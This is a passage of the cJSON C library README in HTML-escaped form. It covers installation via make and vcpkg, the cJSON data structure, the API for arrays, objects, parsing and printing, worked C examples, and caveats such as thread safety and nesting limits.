&#xA;&lt;p&gt;If you don&#39;t have CMake available, but still have GNU make. You can use the makefile to build cJSON:&lt;/p&gt; &#xA;&lt;p&gt;Run this command in the directory with the source code and it will automatically compile static and shared libraries and a little test program (not the full test suite).&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;make all&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you want, you can install the compiled library to your system using &lt;code&gt;make install&lt;/code&gt;. By default it will install the headers in &lt;code&gt;/usr/local/include/cjson&lt;/code&gt; and the libraries in &lt;code&gt;/usr/local/lib&lt;/code&gt;. But you can change this behavior by setting the &lt;code&gt;PREFIX&lt;/code&gt; and &lt;code&gt;DESTDIR&lt;/code&gt; variables: &lt;code&gt;make PREFIX=/usr DESTDIR=temp install&lt;/code&gt;. And uninstall them with: &lt;code&gt;make PREFIX=/usr DESTDIR=temp uninstall&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;Vcpkg&lt;/h4&gt; &#xA;&lt;p&gt;You can download and install cJSON using the &lt;a href=&#34;https://github.com/Microsoft/vcpkg&#34;&gt;vcpkg&lt;/a&gt; dependency manager:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/Microsoft/vcpkg.git&#xA;cd vcpkg&#xA;./bootstrap-vcpkg.sh&#xA;./vcpkg integrate install&#xA;vcpkg install cjson&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The cJSON port in vcpkg is kept up to date by Microsoft team members and community contributors. If the version is out of date, please &lt;a href=&#34;https://github.com/Microsoft/vcpkg&#34;&gt;create an issue or pull request&lt;/a&gt; on the vcpkg repository.&lt;/p&gt; &#xA;&lt;h3&gt;Including cJSON&lt;/h3&gt; &#xA;&lt;p&gt;If you installed it via CMake or the Makefile, you can include cJSON like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;cjson/cJSON.h&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Data Structure&lt;/h3&gt; &#xA;&lt;p&gt;cJSON represents JSON data using the &lt;code&gt;cJSON&lt;/code&gt; struct data type:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* The cJSON structure: */&#xA;typedef struct cJSON&#xA;{&#xA;    struct cJSON *next;&#xA;    struct cJSON *prev;&#xA;    struct cJSON *child;&#xA;    int type;&#xA;    char *valuestring;&#xA;    /* writing to valueint is DEPRECATED, use cJSON_SetNumberValue instead */&#xA;    int valueint;&#xA;    double valuedouble;&#xA;    char *string;&#xA;} cJSON;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;An item of this type represents a JSON value. The type is stored in &lt;code&gt;type&lt;/code&gt; as a bit-flag (&lt;strong&gt;this means that you cannot find out the type by just comparing the value of &lt;code&gt;type&lt;/code&gt;&lt;/strong&gt;).&lt;/p&gt; &#xA;&lt;p&gt;To check the type of an item, use the corresponding &lt;code&gt;cJSON_Is...&lt;/code&gt; function. It does a &lt;code&gt;NULL&lt;/code&gt; check followed by a type check and returns a boolean value if the item is of this type.&lt;/p&gt; &#xA;&lt;p&gt;The type can be one of the following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;cJSON_Invalid&lt;/code&gt; (check with &lt;code&gt;cJSON_IsInvalid&lt;/code&gt;): Represents an invalid item that doesn&#39;t contain any value. You automatically have this type if you set the item to all zero bytes.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;cJSON_False&lt;/code&gt; (check with &lt;code&gt;cJSON_IsFalse&lt;/code&gt;): Represents a &lt;code&gt;false&lt;/code&gt; boolean value. You can also check for boolean values in general with &lt;code&gt;cJSON_IsBool&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;cJSON_True&lt;/code&gt; (check with &lt;code&gt;cJSON_IsTrue&lt;/code&gt;): Represents a &lt;code&gt;true&lt;/code&gt; boolean value. You can also check for boolean values in general with &lt;code&gt;cJSON_IsBool&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;cJSON_NULL&lt;/code&gt; (check with &lt;code&gt;cJSON_IsNull&lt;/code&gt;): Represents a &lt;code&gt;null&lt;/code&gt; value.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;cJSON_Number&lt;/code&gt; (check with &lt;code&gt;cJSON_IsNumber&lt;/code&gt;): Represents a number value. The value is stored as a double in &lt;code&gt;valuedouble&lt;/code&gt; and also in &lt;code&gt;valueint&lt;/code&gt;. If the number is outside of the range of an integer, &lt;code&gt;INT_MAX&lt;/code&gt; or &lt;code&gt;INT_MIN&lt;/code&gt; are used for &lt;code&gt;valueint&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;cJSON_String&lt;/code&gt; (check with &lt;code&gt;cJSON_IsString&lt;/code&gt;): Represents a string value. It is stored in the form of a zero terminated string in &lt;code&gt;valuestring&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;cJSON_Array&lt;/code&gt; (check with &lt;code&gt;cJSON_IsArray&lt;/code&gt;): Represent an array value. This is implemented by pointing &lt;code&gt;child&lt;/code&gt; to a linked list of &lt;code&gt;cJSON&lt;/code&gt; items that represent the values in the array. The elements are linked together using &lt;code&gt;next&lt;/code&gt; and &lt;code&gt;prev&lt;/code&gt;, where the first element has &lt;code&gt;prev.next == NULL&lt;/code&gt; and the last element &lt;code&gt;next == NULL&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;cJSON_Object&lt;/code&gt; (check with &lt;code&gt;cJSON_IsObject&lt;/code&gt;): Represents an object value. Objects are stored same way as an array, the only difference is that the items in the object store their keys in &lt;code&gt;string&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;cJSON_Raw&lt;/code&gt; (check with &lt;code&gt;cJSON_IsRaw&lt;/code&gt;): Represents any kind of JSON that is stored as a zero terminated array of characters in &lt;code&gt;valuestring&lt;/code&gt;. This can be used, for example, to avoid printing the same static JSON over and over again to save performance. cJSON will never create this type when parsing. Also note that cJSON doesn&#39;t check if it is valid JSON.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Additionally there are the following two flags:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;cJSON_IsReference&lt;/code&gt;: Specifies that the item that &lt;code&gt;child&lt;/code&gt; points to and/or &lt;code&gt;valuestring&lt;/code&gt; is not owned by this item, it is only a reference. So &lt;code&gt;cJSON_Delete&lt;/code&gt; and other functions will only deallocate this item, not its &lt;code&gt;child&lt;/code&gt;/&lt;code&gt;valuestring&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;cJSON_StringIsConst&lt;/code&gt;: This means that &lt;code&gt;string&lt;/code&gt; points to a constant string. This means that &lt;code&gt;cJSON_Delete&lt;/code&gt; and other functions will not try to deallocate &lt;code&gt;string&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Working with the data structure&lt;/h3&gt; &#xA;&lt;p&gt;For every value type there is a &lt;code&gt;cJSON_Create...&lt;/code&gt; function that can be used to create an item of that type. All of these will allocate a &lt;code&gt;cJSON&lt;/code&gt; struct that can later be deleted with &lt;code&gt;cJSON_Delete&lt;/code&gt;. Note that you have to delete them at some point, otherwise you will get a memory leak.&lt;br&gt; &lt;strong&gt;Important&lt;/strong&gt;: If you have added an item to an array or an object already, you &lt;strong&gt;mustn&#39;t&lt;/strong&gt; delete it with &lt;code&gt;cJSON_Delete&lt;/code&gt;. Adding it to an array or object transfers its ownership so that when that array or object is deleted, it gets deleted as well. You also could use &lt;code&gt;cJSON_SetValuestring&lt;/code&gt; to change a &lt;code&gt;cJSON_String&lt;/code&gt;&#39;s &lt;code&gt;valuestring&lt;/code&gt;, and you needn&#39;t to free the previous &lt;code&gt;valuestring&lt;/code&gt; manually.&lt;/p&gt; &#xA;&lt;h4&gt;Basic types&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;null&lt;/strong&gt; is created with &lt;code&gt;cJSON_CreateNull&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;booleans&lt;/strong&gt; are created with &lt;code&gt;cJSON_CreateTrue&lt;/code&gt;, &lt;code&gt;cJSON_CreateFalse&lt;/code&gt; or &lt;code&gt;cJSON_CreateBool&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;numbers&lt;/strong&gt; are created with &lt;code&gt;cJSON_CreateNumber&lt;/code&gt;. This will set both &lt;code&gt;valuedouble&lt;/code&gt; and &lt;code&gt;valueint&lt;/code&gt;. If the number is outside of the range of an integer, &lt;code&gt;INT_MAX&lt;/code&gt; or &lt;code&gt;INT_MIN&lt;/code&gt; are used for &lt;code&gt;valueint&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;strings&lt;/strong&gt; are created with &lt;code&gt;cJSON_CreateString&lt;/code&gt; (copies the string) or with &lt;code&gt;cJSON_CreateStringReference&lt;/code&gt; (directly points to the string. This means that &lt;code&gt;valuestring&lt;/code&gt; won&#39;t be deleted by &lt;code&gt;cJSON_Delete&lt;/code&gt; and you are responsible for its lifetime, useful for constants)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Arrays&lt;/h4&gt; &#xA;&lt;p&gt;You can create an empty array with &lt;code&gt;cJSON_CreateArray&lt;/code&gt;. &lt;code&gt;cJSON_CreateArrayReference&lt;/code&gt; can be used to create an array that doesn&#39;t &#34;own&#34; its content, so its content doesn&#39;t get deleted by &lt;code&gt;cJSON_Delete&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To add items to an array, use &lt;code&gt;cJSON_AddItemToArray&lt;/code&gt; to append items to the end. Using &lt;code&gt;cJSON_AddItemReferenceToArray&lt;/code&gt; an element can be added as a reference to another item, array or string. This means that &lt;code&gt;cJSON_Delete&lt;/code&gt; will not delete that items &lt;code&gt;child&lt;/code&gt; or &lt;code&gt;valuestring&lt;/code&gt; properties, so no double frees are occurring if they are already used elsewhere. To insert items in the middle, use &lt;code&gt;cJSON_InsertItemInArray&lt;/code&gt;. It will insert an item at the given 0 based index and shift all the existing items to the right.&lt;/p&gt; &#xA;&lt;p&gt;If you want to take an item out of an array at a given index and continue using it, use &lt;code&gt;cJSON_DetachItemFromArray&lt;/code&gt;, it will return the detached item, so be sure to assign it to a pointer, otherwise you will have a memory leak.&lt;/p&gt; &#xA;&lt;p&gt;Deleting items is done with &lt;code&gt;cJSON_DeleteItemFromArray&lt;/code&gt;. It works like &lt;code&gt;cJSON_DetachItemFromArray&lt;/code&gt;, but deletes the detached item via &lt;code&gt;cJSON_Delete&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You can also replace an item in an array in place. Either with &lt;code&gt;cJSON_ReplaceItemInArray&lt;/code&gt; using an index or with &lt;code&gt;cJSON_ReplaceItemViaPointer&lt;/code&gt; given a pointer to an element. &lt;code&gt;cJSON_ReplaceItemViaPointer&lt;/code&gt; will return &lt;code&gt;0&lt;/code&gt; if it fails. What this does internally is to detach the old item, delete it and insert the new item in its place.&lt;/p&gt; &#xA;&lt;p&gt;To get the size of an array, use &lt;code&gt;cJSON_GetArraySize&lt;/code&gt;. Use &lt;code&gt;cJSON_GetArrayItem&lt;/code&gt; to get an element at a given index.&lt;/p&gt; &#xA;&lt;p&gt;Because an array is stored as a linked list, iterating it via index is inefficient (&lt;code&gt;O(n²)&lt;/code&gt;), so you can iterate over an array using the &lt;code&gt;cJSON_ArrayForEach&lt;/code&gt; macro in &lt;code&gt;O(n)&lt;/code&gt; time complexity.&lt;/p&gt; &#xA;&lt;h4&gt;Objects&lt;/h4&gt; &#xA;&lt;p&gt;You can create an empty object with &lt;code&gt;cJSON_CreateObject&lt;/code&gt;. &lt;code&gt;cJSON_CreateObjectReference&lt;/code&gt; can be used to create an object that doesn&#39;t &#34;own&#34; its content, so its content doesn&#39;t get deleted by &lt;code&gt;cJSON_Delete&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To add items to an object, use &lt;code&gt;cJSON_AddItemToObject&lt;/code&gt;. Use &lt;code&gt;cJSON_AddItemToObjectCS&lt;/code&gt; to add an item to an object with a name that is a constant or reference (key of the item, &lt;code&gt;string&lt;/code&gt; in the &lt;code&gt;cJSON&lt;/code&gt; struct), so that it doesn&#39;t get freed by &lt;code&gt;cJSON_Delete&lt;/code&gt;. Using &lt;code&gt;cJSON_AddItemReferenceToArray&lt;/code&gt; an element can be added as a reference to another object, array or string. This means that &lt;code&gt;cJSON_Delete&lt;/code&gt; will not delete that items &lt;code&gt;child&lt;/code&gt; or &lt;code&gt;valuestring&lt;/code&gt; properties, so no double frees are occurring if they are already used elsewhere.&lt;/p&gt; &#xA;&lt;p&gt;If you want to take an item out of an object, use &lt;code&gt;cJSON_DetachItemFromObjectCaseSensitive&lt;/code&gt;, it will return the detached item, so be sure to assign it to a pointer, otherwise you will have a memory leak.&lt;/p&gt; &#xA;&lt;p&gt;Deleting items is done with &lt;code&gt;cJSON_DeleteItemFromObjectCaseSensitive&lt;/code&gt;. It works like &lt;code&gt;cJSON_DetachItemFromObjectCaseSensitive&lt;/code&gt; followed by &lt;code&gt;cJSON_Delete&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You can also replace an item in an object in place. Either with &lt;code&gt;cJSON_ReplaceItemInObjectCaseSensitive&lt;/code&gt; using a key or with &lt;code&gt;cJSON_ReplaceItemViaPointer&lt;/code&gt; given a pointer to an element. &lt;code&gt;cJSON_ReplaceItemViaPointer&lt;/code&gt; will return &lt;code&gt;0&lt;/code&gt; if it fails. What this does internally is to detach the old item, delete it and insert the new item in its place.&lt;/p&gt; &#xA;&lt;p&gt;To get the size of an object, you can use &lt;code&gt;cJSON_GetArraySize&lt;/code&gt;, this works because internally objects are stored as arrays.&lt;/p&gt; &#xA;&lt;p&gt;If you want to access an item in an object, use &lt;code&gt;cJSON_GetObjectItemCaseSensitive&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To iterate over an object, you can use the &lt;code&gt;cJSON_ArrayForEach&lt;/code&gt; macro the same way as for arrays.&lt;/p&gt; &#xA;&lt;p&gt;cJSON also provides convenient helper functions for quickly creating a new item and adding it to an object, like &lt;code&gt;cJSON_AddNullToObject&lt;/code&gt;. They return a pointer to the new item or &lt;code&gt;NULL&lt;/code&gt; if they failed.&lt;/p&gt; &#xA;&lt;h3&gt;Parsing JSON&lt;/h3&gt; &#xA;&lt;p&gt;Given some JSON in a zero terminated string, you can parse it with &lt;code&gt;cJSON_Parse&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;cJSON *json = cJSON_Parse(string);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Given some JSON in a string (whether zero terminated or not), you can parse it with &lt;code&gt;cJSON_ParseWithLength&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;cJSON *json = cJSON_ParseWithLength(string, buffer_length);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It will parse the JSON and allocate a tree of &lt;code&gt;cJSON&lt;/code&gt; items that represents it. Once it returns, you are fully responsible for deallocating it after use with &lt;code&gt;cJSON_Delete&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The allocator used by &lt;code&gt;cJSON_Parse&lt;/code&gt; is &lt;code&gt;malloc&lt;/code&gt; and &lt;code&gt;free&lt;/code&gt; by default but can be changed (globally) with &lt;code&gt;cJSON_InitHooks&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If an error occurs a pointer to the position of the error in the input string can be accessed using &lt;code&gt;cJSON_GetErrorPtr&lt;/code&gt;. Note though that this can produce race conditions in multithreading scenarios, in that case it is better to use &lt;code&gt;cJSON_ParseWithOpts&lt;/code&gt; with &lt;code&gt;return_parse_end&lt;/code&gt;. By default, characters in the input string that follow the parsed JSON will not be considered as an error.&lt;/p&gt; &#xA;&lt;p&gt;If you want more options, use &lt;code&gt;cJSON_ParseWithOpts(const char *value, const char **return_parse_end, cJSON_bool require_null_terminated)&lt;/code&gt;. &lt;code&gt;return_parse_end&lt;/code&gt; returns a pointer to the end of the JSON in the input string or the position that an error occurs at (thereby replacing &lt;code&gt;cJSON_GetErrorPtr&lt;/code&gt; in a thread safe way). &lt;code&gt;require_null_terminated&lt;/code&gt;, if set to &lt;code&gt;1&lt;/code&gt; will make it an error if the input string contains data after the JSON.&lt;/p&gt; &#xA;&lt;p&gt;If you want more options giving buffer length, use &lt;code&gt;cJSON_ParseWithLengthOpts(const char *value, size_t buffer_length, const char **return_parse_end, cJSON_bool require_null_terminated)&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Printing JSON&lt;/h3&gt; &#xA;&lt;p&gt;Given a tree of &lt;code&gt;cJSON&lt;/code&gt; items, you can print them as a string using &lt;code&gt;cJSON_Print&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;char *string = cJSON_Print(json);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It will allocate a string and print a JSON representation of the tree into it. Once it returns, you are fully responsible for deallocating it after use with your allocator. (usually &lt;code&gt;free&lt;/code&gt;, depends on what has been set with &lt;code&gt;cJSON_InitHooks&lt;/code&gt;).&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;cJSON_Print&lt;/code&gt; will print with whitespace for formatting. If you want to print without formatting, use &lt;code&gt;cJSON_PrintUnformatted&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If you have a rough idea of how big your resulting string will be, you can use &lt;code&gt;cJSON_PrintBuffered(const cJSON *item, int prebuffer, cJSON_bool fmt)&lt;/code&gt;. &lt;code&gt;fmt&lt;/code&gt; is a boolean to turn formatting with whitespace on and off. &lt;code&gt;prebuffer&lt;/code&gt; specifies the first buffer size to use for printing. &lt;code&gt;cJSON_Print&lt;/code&gt; currently uses 256 bytes for its first buffer size. Once printing runs out of space, a new buffer is allocated and the old gets copied over before printing is continued.&lt;/p&gt; &#xA;&lt;p&gt;These dynamic buffer allocations can be completely avoided by using &lt;code&gt;cJSON_PrintPreallocated(cJSON *item, char *buffer, const int length, const cJSON_bool format)&lt;/code&gt;. It takes a buffer to a pointer to print to and its length. If the length is reached, printing will fail and it returns &lt;code&gt;0&lt;/code&gt;. In case of success, &lt;code&gt;1&lt;/code&gt; is returned. Note that you should provide 5 bytes more than is actually needed, because cJSON is not 100% accurate in estimating if the provided memory is enough.&lt;/p&gt; &#xA;&lt;h3&gt;Example&lt;/h3&gt; &#xA;&lt;p&gt;In this example we want to build and parse the following JSON:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;    &#34;name&#34;: &#34;Awesome 4K&#34;,&#xA;    &#34;resolutions&#34;: [&#xA;        {&#xA;            &#34;width&#34;: 1280,&#xA;            &#34;height&#34;: 720&#xA;        },&#xA;        {&#xA;            &#34;width&#34;: 1920,&#xA;            &#34;height&#34;: 1080&#xA;        },&#xA;        {&#xA;            &#34;width&#34;: 3840,&#xA;            &#34;height&#34;: 2160&#xA;        }&#xA;    ]&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Printing&lt;/h4&gt; &#xA;&lt;p&gt;Let&#39;s build the above JSON and print it to a string:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;//create a monitor with a list of supported resolutions&#xA;//NOTE: Returns a heap allocated string, you are required to free it after use.&#xA;char *create_monitor(void)&#xA;{&#xA;    const unsigned int resolution_numbers[3][2] = {&#xA;        {1280, 720},&#xA;        {1920, 1080},&#xA;        {3840, 2160}&#xA;    };&#xA;    char *string = NULL;&#xA;    cJSON *name = NULL;&#xA;    cJSON *resolutions = NULL;&#xA;    cJSON *resolution = NULL;&#xA;    cJSON *width = NULL;&#xA;    cJSON *height = NULL;&#xA;    size_t index = 0;&#xA;&#xA;    cJSON *monitor = cJSON_CreateObject();&#xA;    if (monitor == NULL)&#xA;    {&#xA;        goto end;&#xA;    }&#xA;&#xA;    name = cJSON_CreateString(&#34;Awesome 4K&#34;);&#xA;    if (name == NULL)&#xA;    {&#xA;        goto end;&#xA;    }&#xA;    /* after creation was successful, immediately add it to the monitor,&#xA;     * thereby transferring ownership of the pointer to it */&#xA;    cJSON_AddItemToObject(monitor, &#34;name&#34;, name);&#xA;&#xA;    resolutions = cJSON_CreateArray();&#xA;    if (resolutions == NULL)&#xA;    {&#xA;        goto end;&#xA;    }&#xA;    cJSON_AddItemToObject(monitor, &#34;resolutions&#34;, resolutions);&#xA;&#xA;    for (index = 0; index &amp;lt; (sizeof(resolution_numbers) / (2 * sizeof(int))); ++index)&#xA;    {&#xA;        resolution = cJSON_CreateObject();&#xA;        if (resolution == NULL)&#xA;        {&#xA;            goto end;&#xA;        }&#xA;        cJSON_AddItemToArray(resolutions, resolution);&#xA;&#xA;        width = cJSON_CreateNumber(resolution_numbers[index][0]);&#xA;        if (width == NULL)&#xA;        {&#xA;            goto end;&#xA;        }&#xA;        cJSON_AddItemToObject(resolution, &#34;width&#34;, width);&#xA;&#xA;        height = cJSON_CreateNumber(resolution_numbers[index][1]);&#xA;        if (height == NULL)&#xA;        {&#xA;            goto end;&#xA;        }&#xA;        cJSON_AddItemToObject(resolution, &#34;height&#34;, height);&#xA;    }&#xA;&#xA;    string = cJSON_Print(monitor);&#xA;    if (string == NULL)&#xA;    {&#xA;        fprintf(stderr, &#34;Failed to print monitor.\n&#34;);&#xA;    }&#xA;&#xA;end:&#xA;    cJSON_Delete(monitor);&#xA;    return string;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Alternatively we can use the &lt;code&gt;cJSON_Add...ToObject&lt;/code&gt; helper functions to make our lives a little easier:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;//NOTE: Returns a heap allocated string, you are required to free it after use.&#xA;char *create_monitor_with_helpers(void)&#xA;{&#xA;    const unsigned int resolution_numbers[3][2] = {&#xA;        {1280, 720},&#xA;        {1920, 1080},&#xA;        {3840, 2160}&#xA;    };&#xA;    char *string = NULL;&#xA;    cJSON *resolutions = NULL;&#xA;    size_t index = 0;&#xA;&#xA;    cJSON *monitor = cJSON_CreateObject();&#xA;&#xA;    if (cJSON_AddStringToObject(monitor, &#34;name&#34;, &#34;Awesome 4K&#34;) == NULL)&#xA;    {&#xA;        goto end;&#xA;    }&#xA;&#xA;    resolutions = cJSON_AddArrayToObject(monitor, &#34;resolutions&#34;);&#xA;    if (resolutions == NULL)&#xA;    {&#xA;        goto end;&#xA;    }&#xA;&#xA;    for (index = 0; index &amp;lt; (sizeof(resolution_numbers) / (2 * sizeof(int))); ++index)&#xA;    {&#xA;        cJSON *resolution = cJSON_CreateObject();&#xA;&#xA;        if (cJSON_AddNumberToObject(resolution, &#34;width&#34;, resolution_numbers[index][0]) == NULL)&#xA;        {&#xA;            goto end;&#xA;        }&#xA;&#xA;        if (cJSON_AddNumberToObject(resolution, &#34;height&#34;, resolution_numbers[index][1]) == NULL)&#xA;        {&#xA;            goto end;&#xA;        }&#xA;&#xA;        cJSON_AddItemToArray(resolutions, resolution);&#xA;    }&#xA;&#xA;    string = cJSON_Print(monitor);&#xA;    if (string == NULL)&#xA;    {&#xA;        fprintf(stderr, &#34;Failed to print monitor.\n&#34;);&#xA;    }&#xA;&#xA;end:&#xA;    cJSON_Delete(monitor);&#xA;    return string;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Parsing&lt;/h4&gt; &#xA;&lt;p&gt;In this example we will parse a JSON in the above format and check if the monitor supports a Full HD resolution while printing some diagnostic output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* return 1 if the monitor supports full hd, 0 otherwise */&#xA;int supports_full_hd(const char * const monitor)&#xA;{&#xA;    const cJSON *resolution = NULL;&#xA;    const cJSON *resolutions = NULL;&#xA;    const cJSON *name = NULL;&#xA;    int status = 0;&#xA;    cJSON *monitor_json = cJSON_Parse(monitor);&#xA;    if (monitor_json == NULL)&#xA;    {&#xA;        const char *error_ptr = cJSON_GetErrorPtr();&#xA;        if (error_ptr != NULL)&#xA;        {&#xA;            fprintf(stderr, &#34;Error before: %s\n&#34;, error_ptr);&#xA;        }&#xA;        status = 0;&#xA;        goto end;&#xA;    }&#xA;&#xA;    name = cJSON_GetObjectItemCaseSensitive(monitor_json, &#34;name&#34;);&#xA;    if (cJSON_IsString(name) &amp;amp;&amp;amp; (name-&amp;gt;valuestring != NULL))&#xA;    {&#xA;        printf(&#34;Checking monitor \&#34;%s\&#34;\n&#34;, name-&amp;gt;valuestring);&#xA;    }&#xA;&#xA;    resolutions = cJSON_GetObjectItemCaseSensitive(monitor_json, &#34;resolutions&#34;);&#xA;    cJSON_ArrayForEach(resolution, resolutions)&#xA;    {&#xA;        cJSON *width = cJSON_GetObjectItemCaseSensitive(resolution, &#34;width&#34;);&#xA;        cJSON *height = cJSON_GetObjectItemCaseSensitive(resolution, &#34;height&#34;);&#xA;&#xA;        if (!cJSON_IsNumber(width) || !cJSON_IsNumber(height))&#xA;        {&#xA;            status = 0;&#xA;            goto end;&#xA;        }&#xA;&#xA;        if ((width-&amp;gt;valuedouble == 1920) &amp;amp;&amp;amp; (height-&amp;gt;valuedouble == 1080))&#xA;        {&#xA;            status = 1;&#xA;            goto end;&#xA;        }&#xA;    }&#xA;&#xA;end:&#xA;    cJSON_Delete(monitor_json);&#xA;    return status;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note that there are no NULL checks except for the result of &lt;code&gt;cJSON_Parse&lt;/code&gt; because &lt;code&gt;cJSON_GetObjectItemCaseSensitive&lt;/code&gt; checks for &lt;code&gt;NULL&lt;/code&gt; inputs already, so a &lt;code&gt;NULL&lt;/code&gt; value is just propagated and &lt;code&gt;cJSON_IsNumber&lt;/code&gt; and &lt;code&gt;cJSON_IsString&lt;/code&gt; return &lt;code&gt;0&lt;/code&gt; if the input is &lt;code&gt;NULL&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Caveats&lt;/h3&gt; &#xA;&lt;h4&gt;Zero Character&lt;/h4&gt; &#xA;&lt;p&gt;cJSON doesn&#39;t support strings that contain the zero character &lt;code&gt;&#39;\0&#39;&lt;/code&gt; or &lt;code&gt;\u0000&lt;/code&gt;. This is impossible with the current API because strings are zero terminated.&lt;/p&gt; &#xA;&lt;h4&gt;Character Encoding&lt;/h4&gt; &#xA;&lt;p&gt;cJSON only supports UTF-8 encoded input. In most cases it doesn&#39;t reject invalid UTF-8 as input though, it just propagates it through as is. As long as the input doesn&#39;t contain invalid UTF-8, the output will always be valid UTF-8.&lt;/p&gt; &#xA;&lt;h4&gt;C Standard&lt;/h4&gt; &#xA;&lt;p&gt;cJSON is written in ANSI C (or C89, C90). If your compiler or C library doesn&#39;t follow this standard, correct behavior is not guaranteed.&lt;/p&gt; &#xA;&lt;p&gt;NOTE: ANSI C is not C++ therefore it shouldn&#39;t be compiled with a C++ compiler. You can compile it with a C compiler and link it with your C++ code however. Although compiling with a C++ compiler might work, correct behavior is not guaranteed.&lt;/p&gt; &#xA;&lt;h4&gt;Floating Point Numbers&lt;/h4&gt; &#xA;&lt;p&gt;cJSON does not officially support any &lt;code&gt;double&lt;/code&gt; implementations other than IEEE754 double precision floating point numbers. It might still work with other implementations but bugs with these will be considered invalid.&lt;/p&gt; &#xA;&lt;p&gt;The maximum length of a floating point literal that cJSON supports is currently 63 characters.&lt;/p&gt; &#xA;&lt;h4&gt;Deep Nesting Of Arrays And Objects&lt;/h4&gt; &#xA;&lt;p&gt;cJSON doesn&#39;t support arrays and objects that are nested too deeply because this would result in a stack overflow. To prevent this cJSON limits the depth to &lt;code&gt;CJSON_NESTING_LIMIT&lt;/code&gt; which is 1000 by default but can be changed at compile time.&lt;/p&gt; &#xA;&lt;h4&gt;Thread Safety&lt;/h4&gt; &#xA;&lt;p&gt;In general cJSON is &lt;strong&gt;not thread safe&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;However it is thread safe under the following conditions:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;cJSON_GetErrorPtr&lt;/code&gt; is never used (the &lt;code&gt;return_parse_end&lt;/code&gt; parameter of &lt;code&gt;cJSON_ParseWithOpts&lt;/code&gt; can be used instead)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;cJSON_InitHooks&lt;/code&gt; is only ever called before using cJSON in any threads.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;setlocale&lt;/code&gt; is never called before all calls to cJSON functions have returned.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Case Sensitivity&lt;/h4&gt; &#xA;&lt;p&gt;When cJSON was originally created, it didn&#39;t follow the JSON standard and didn&#39;t make a distinction between uppercase and lowercase letters. If you want the correct, standard compliant, behavior, you need to use the &lt;code&gt;CaseSensitive&lt;/code&gt; functions where available.&lt;/p&gt; &#xA;&lt;h4&gt;Duplicate Object Members&lt;/h4&gt; 